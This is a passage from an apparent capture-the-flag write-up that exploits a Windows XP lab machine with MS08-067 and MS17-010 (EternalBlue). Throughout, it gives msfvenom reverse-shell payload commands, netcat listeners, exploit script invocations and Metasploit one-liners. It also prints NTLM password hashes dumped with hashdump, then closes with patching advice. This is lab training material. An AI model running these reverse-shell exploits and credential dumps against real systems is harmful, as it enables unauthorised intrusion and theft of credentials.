shell code using followingmsfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=1337 EXITFUNC=thread -b &quot;\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40&quot; -f c -a x86 --platform windowsWe have to copy this generated shellcode and put it in exploit at line 53.We have to remove the existing shell code and put out shellcode in shellcode() function.Now we are ready to execute exploit script using the following command.rlwrap nc -lvnp 1337 # setting up listenerpython ms08-067.py 10.129.178.214 6 445 Note : We are selecting 6 because target is running Windows XP SP3 which was found in nmap enumeration. In case of other language of XP or other varient of OS. Enumeration and hit n trial will be required.And finally we get a shell.MS17-010For exploiting the target using MS17-010 we can use the following exploit from github. MS17-010git clone https://github.com/helviojunior/MS17-010.gitcd MS17-010/python checker.py 10.129.178.214The checker.py script also confirms this is vulnerable to MS17-010.This exploit requires malicious executable to get a reverse shell. We will create it using following commands in the same location of exploit.msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f exe &amp;gt; eternalblue.exeAnd run the exploit after setting up ncat listener.rlwrap nc -lvnp 1337# python send_and_execute.py TARGET_IP eternalblue.exepython send_and_execute.py 10.129.178.214 eternalblue.exeAnd finally we get a shell.Metasploit | MS17-010With below one liner we can exploit target with Metasploit MS17-010 module and get meterpreter shell.msfconsole -q -x &quot;use exploit/windows/smb/ms17_010_psexec; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 4444; set RHOSTS 10.129.178.214; run;&quot;Metasploit | MS08-067msfconsole -q -x &quot;use exploit/windows/smb/ms08_067_netapi; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 5555; set RHOSTS 10.129.178.214; run;&quot;Post ExploitationThis system didn’t had whoami to check the privileges.TCP Reverse ShellUsing SMB Server and executing we got to know we have highest privilege in system.# in attacker machinesudo smbserver.py a /usr/share/windows-resources/binaries/ # in target machine\\\\10.10.17.81\\a\\whoami.exeMeterpreterUsing getuid we got current user. And using hashdump following hashes were collected.Administrator:500:b47234f31e261b47587db580d0d5f393:b1e8bd81ee9a6679befb976c0b9b6827:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::HelpAssistant:1000:0ca071c2a387b648559a926bfe39f8d7:332e3bd65dbe0af563383faff76c6dc5:::john:1003:dc6e5a1d0d4929c2969213afe9351474:54ee9a60735ab539438797574a9487ad:::SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:f2b8398cafc7174be746a74a3a7a3823:::RecommendationSMB was enabled on outdated un-supported Winodws XP and SMB message signing was disabled. And running with privileges of Administrator. Update to latest supported version of Windows. Advised not to run SMB service with disabled message signing as Administrator.Key LearningIn this pentest, with easiest enumeration we got to know target is vulnerable to eternal blue. And there are a lot of exploits available for this on github and other resources.Going forward keeping a fork of working exploit` with instructions to run it will help saving a a lot time in pentest period.Outdated exploits like Eternal blue have dependency issues because of older version of python libraries.To save trouble it would be good idea to get libraries in virtual environment and run the exploit." } ]
